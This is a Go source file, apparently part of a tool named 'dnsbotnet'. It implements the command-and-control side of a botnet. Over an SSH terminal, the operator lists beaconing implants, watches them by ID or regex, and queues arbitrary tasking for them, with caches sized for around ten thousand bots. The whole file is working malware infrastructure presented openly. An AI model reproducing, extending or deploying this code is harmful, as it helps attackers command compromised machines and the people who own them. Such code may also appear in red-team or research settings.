package main

/*
 * c2.go
 * Handle C2 tasking
 * By J. Stuart McMurray
 * Created 20180210
 * Last Modified 20180211
 */

import (
	"container/list"
	"fmt"
	"io"
	"log"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"

	lru "github.com/hashicorp/golang-lru"
	"golang.org/x/crypto/ssh/terminal"
)

// C2Client represents a connected C2 client
type C2Client struct {
	l       *sync.Mutex
	tag     string
	t       *terminal.Terminal
	r       *regexp.Regexp
	log     *log.Logger
	id      string       /* Implant ID */
	evictOk bool         /* Ok to evict nicely */
	close   func() error /* Close the underlying ssh.Channel */
}

// NewC2Client returns an initialized *C2Client
func NewC2Client(
	tag string,
	t *terminal.Terminal,
	close func() error,
) *C2Client {
	return &C2Client{
		l:     new(sync.Mutex),
		tag:   tag,
		t:     t,
		log:   log.New(t, "", log.LstdFlags),
		close: close,
	}
}

// Implant represents a known implant
type Implant struct {
	id   string
	l    *sync.Mutex
	q    *list.List /* Task queue */
	seen time.Time  /* Last time implant was seen */
}

// NewImplant returns a new, initialized Implant with the given ID
func NewImplant(id string) *Implant {
	return &Implant{
		id: id,
		l:  new(sync.Mutex),
		q:  list.New(),
	}
}

const (
	// SSHVERSION is the SSH server version banner
	SSHVERSION = "SSH-2.0-dnsbotnet-0.0.0"

	// KEYLEN is the size of an SSH private key to generate
	KEYLEN = 2048

	// IMPLANTCACHESIZE is the number of implants we track at once.  It
	// needs to be at least as large as the number of bots in the botnet.
	IMPLANTCACHESIZE = 10240

	// MAXCLIENTCOUNT is the maximum number of concurrent clients we track.
	// If we have more clients than this, the one with the least-recent
	// activity will be closed.  This is to mitigate the risk of buggy C2
	// scripts.
	MAXCLIENTCOUNT = 10240

	// C2HELP is a helpful list of commands
	C2HELP = `Available commands:
help        - This message
id          - Show all beacons
idr <regex> - Show beacons from implants matching regex
id <ID>     - Show a particular implant's output (not beacons)
t <ID>      - Task the current implant (after ID is set)
last [n]    - Show the [n most recent] beacons from all implants
exit        - Goodbye.`
)

var (
	// AKFILE is the name of the file holding authorized keys
	AKFILE string

	// IMPLANTS holds all of the implants we've seen or we've tasked
	IMPLANTS *lru.Cache

	// CLIENTS holds all of the connected client sessions
	CLIENTS *lru.Cache
)

func init() {
	var err error
	/* Make implants cache.  Warn if we're forgetting implants. */
	IMPLANTS, err = lru.NewWithEvict(IMPLANTCACHESIZE, func(
		key interface{},
		value interface{},
	) {
		log.Printf(
			"[ID-%v] Forgetting, which means we have more "+
				"implants than cache.  This is bad.  Please "+
				"adjust IMPLANTCACHESIZE and rebuild.",
			key,
		)

	})
	if nil != err {
		panic(err)
	}
	/* Make clients cache.  Close the underlying channel and warn when
	there's too many */
	CLIENTS, err = lru.NewWithEvict(MAXCLIENTCOUNT, func(
		key interface{},
		value interface{},
	) {
		c, ok := key.(*C2Client)
		if !ok {
			log.Panicf("Wrong client type %T", key)
		}
		if !c.evictOk {
			fmt.Fprintf(
				c.t,
				"Too many connected clients.  Sorry.\n",
			)
			log.Printf(
				"%v Closing due to too many clients",
				c.tag,
			)
		}
		if err := c.close(); nil != err && !c.evictOk {
			log.Printf("%v Unable to evict-close: %v", c.tag, err)
		}
	})
	if nil != err {
		panic(err)
	}
}

// HandleC2Command processes the C2 command sent by a user.  The current (or
// changed) implant ID is returned as well as any errors encountered.
func HandleC2Command(c *C2Client, line string) error {
	/* Get the command and argument */
	parts := strings.SplitN(line, " ", 2)
	if 0 == len(parts) { /* Empty line */
		return nil
	}

	/* Get the argument, if we have one */
	var arg string
	if 2 == len(parts) {
		arg = parts[1]
	}
	arg = strings.TrimSpace(arg)

	/* Execute the command */
	switch parts[0] {
	case "id": /* Set active ID */
		watchID(c, arg)
	case "idr": /* Set active ID pattern (beacon/output only) */
		watchRegex(c, arg)
	case "t": /* Task an implant */
		taskImplant(c, arg)
	case "last":
		listLastImplants(c, arg)
	case "exit":
		return io.EOF
	case "h", "help", "?":
		fmt.Fprintf(c.t, "%v\n", C2HELP)
	default:
		fmt.Fprintf(c.t, "Unknown command %q\n", parts[0])
	}

	return nil
}

/* watchID updates c to watch the implant with the given ID. */
func watchID(c *C2Client, id string) {
	c.l.Lock()
	defer c.l.Unlock()

	c.id = strings.ToLower(id)
	c.r = nil

	/* No argument means watch everything */
	if "" == id {
		c.t.SetPrompt("> ")
		log.Printf("%v Watching everything", c.tag)
		c.log.Printf("Watching everything")
		return
	}

	/* Update prompt and log */
	c.t.SetPrompt(fmt.Sprintf("%v> ", c.id))
	log.Printf("%v Watching implant with ID %v", c.tag, c.id)
	c.log.Printf("Watching implant with ID %q", c.id)
}

/* watchRegex updates c to watch implants with ID's matching the regex re */
func watchRegex(c *C2Client, re string) {
	c.l.Lock()
	defer c.l.Unlock()

	/* If it's empty, watch everything */
	if "" == re {
		c.r = nil
		c.id = ""
		c.t.SetPrompt("> ")
		log.Printf("%v Watching everything", c.tag)
		c.log.Printf("Watching everything")
		return
	}

	/* Make sure regex compiles */
	r, err := regexp.Compile(re)
	if nil != err {
		fmt.Fprintf(
			c.t,
			"Invalid regular expression %q: %v\n",
			re,
			err,
		)
		return
	}
	c.r = r
	c.id = ""

	/* Update prompt and log */
	c.t.SetPrompt(fmt.Sprintf("re:%v> ", c.r))
	log.Printf("%v Watching regex %q", c.tag, c.r)
	c.log.Printf("Watching implants which match %q", c.r)
}

/* taskImplant sets the tasking for an implant */
func taskImplant(c *C2Client, task string) {
	/* Make sure we have an ID */
	if "" == c.id {
		fmt.Fprintf(c.t, "Need an ID (id <id>) before tasking\n")
		return
	}

	/* Make sure we have tasking */
	if "" == task {
		fmt.Fprintf(c.t, "No tasking given\n")
		return
	}

	/* Set tasking */
	if err := SetTasking(c.id, []byte(task)); nil != err {
		log.Printf("%v Unable to set tasking: %v", c.tag, err)
		fmt.Fprintf(c.t, "Error: %v\n", err)
		return
	}

	/* Log the tasking */
	log.Printf("%v QUEUED: %v <- %q", c.tag, c.id, string(task))
	c.log.Printf(
		"Queued task for implant %v: %s",
		c.id,
		string(task),
	)
}

/* listLastImplants lists the last count implants and the time they called
back.  If n is the empty string, list all implants */
func listLastImplants(c *C2Client, count string) {
	/* Turn count into a number */
	var (
		n   int
		err error
	)
	if "" != count {
		n, err = strconv.Atoi(count)
		if nil != err {
			fmt.Fprintf(
				c.t,
				"Cannot turn %q into a number: %v",
				count,
				err,
			)
		}
	}

	/* Get all known implants */
	var is []*Implant
	for _, k := range IMPLANTS.Keys() {
		/* Get implant */
		v, ok := IMPLANTS.Get(k)
		if !ok {
			continue
		}
		i, ok := v.(*Implant)
		if !ok {
			log.Panicf("Invalid implant type: %T", v)
		}
		if nil == i {
			continue
		}
		/* Don't care about implants that haven't been seen. */
		if i.seen.IsZero() {
			continue
		}
		/* Save this one for sorting and printing */
		is = append(is, i)
	}
	if 0 == len(is) {
		c.log.Printf("No implants seen yet")
		return
	}

	/* Sort oldest to newest */
	sort.Slice(is, func(i, j int) bool {
		return is[i].seen.Before(is[j].seen)
	})

	/* Reduce to the number we need */
	if 0 != n {
		start := len(is) - n
		if 0 > start {
			start = 0
		}
		is = is[start:len(is)]
	}

	/* Print in a nice table */
	tw := tabwriter.NewWriter(c.t, 1, 8, 1, ' ', 0)
	fmt.Fprintf(tw, "ID\tQueued\tLast Seen\n")
	fmt.Fprintf(tw, "--\t------\t---------\n")
	for _, i := range is {
		i.l.Lock()
		defer i.l.Unlock()
		fmt.Fprintf(
			tw,
			"%v\t%v\t%v (%v)\n",
			i.id,
			i.q.Len(),
			i.seen.Format(time.RFC3339),
			time.Now().Sub(i.seen).Round(time.Second/10),
		)
	}
	tw.Flush()
	fmt.Fprintf(
		c.t,
		"\nCurrent time is %v\n",
		time.Now().Format(time.RFC3339),
	)
}
